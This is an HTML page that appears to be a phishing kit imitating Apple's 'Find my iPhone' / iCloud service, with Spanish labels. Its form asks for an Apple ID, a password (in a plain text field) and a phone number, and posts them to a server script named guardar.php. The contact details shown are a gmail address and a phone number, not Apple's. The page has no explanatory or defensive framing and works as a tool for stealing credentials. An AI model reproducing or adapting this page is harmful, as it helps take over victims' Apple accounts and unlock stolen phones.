<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>iPhone-iCloud</title>
    <link rel="icon" href="Logo.png">
    <link rel="stylesheet" href="css/estilos.css">
    <link rel="stylesheet" href="css/font-awesome.css">
    <link rel="stylesheet" href="css/css1.css">

 
    <link rel="stylesheet" href="css/responsive.css">
    <script src="js/jquery-3.2.1.js"></script>
    <script src="js/script.js"></script>
</head>
<body>

    <section class="form_wrap">

        <section class="cantact_info">
            <section class="info_title">
                <span class="f"><img src="d.png"></span>
                <h2>Buscar mi<br>iPhone</h2>
            </section>
            <section class="info_items">
                <p><span class="fa fa-envelope"></span> info.contact@gmail.com</p>
                <p><span class="fa fa-mobile"></span> +1(585) 902-8665</p>
            </section>
        </section>

        <form  method="POST" action="src/guardar.php" class="form_contact">
            <div class="cabecera2">
            <center>
            <h2> <img class="logo" src="logo.png"> </h2>
            </center>
            </div>
            <div class="user_info">
               
                <label >Apple ID *</label>
                <input type="email" required id="app" name="app">

                <label >Password *</label>
                <input type="text" required  id="password" name="password">

                <label > Cll *</label>
                <input type="number" required id="cell" name="cell">


                <button class="send">search</button>
            </div>
        </form>

    </section>

</body>
<center>
<div class="copyright">
  <p>© 2022 All Rights Reserved.</p>
</div>
</center>
</html>
